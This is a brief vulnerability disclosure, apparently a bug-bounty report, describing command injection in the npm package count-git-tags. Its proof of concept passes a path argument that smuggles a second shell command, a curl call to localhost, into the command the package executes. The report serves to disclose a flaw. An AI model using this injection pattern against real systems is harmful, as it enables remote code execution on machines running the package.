# Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/aichbauer/node-count-git-tags/blob/master/index.js#L27

# POC

```js
// poc.js
const countGitTags = require('count-git-tags');
 
countGitTags({ path: '.git;curl "http://localhost/RCE"' });
```

# Impact

`RCE` on `count-git-tags` via `insecure command formatting`
